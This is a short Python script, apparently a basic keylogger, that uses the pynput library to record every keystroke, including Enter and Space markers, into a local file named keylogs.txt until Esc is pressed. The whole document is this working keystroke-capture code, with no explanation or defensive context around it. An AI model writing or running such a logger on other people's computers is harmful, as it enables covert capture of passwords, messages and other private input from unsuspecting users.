from pynput.keyboard import Listener, Key

def on_press(key):
    global f
    try:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.enter:
            f.write('[ENTER]')
        elif key == Key.space:
            f.write('[SPACE]')
        elif key == Key.esc:
            return False
    except Exception as e:
        print(f'Error writing to file: {e}')

f = open('keylogs.txt', 'a')
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
finally:
    f.close()
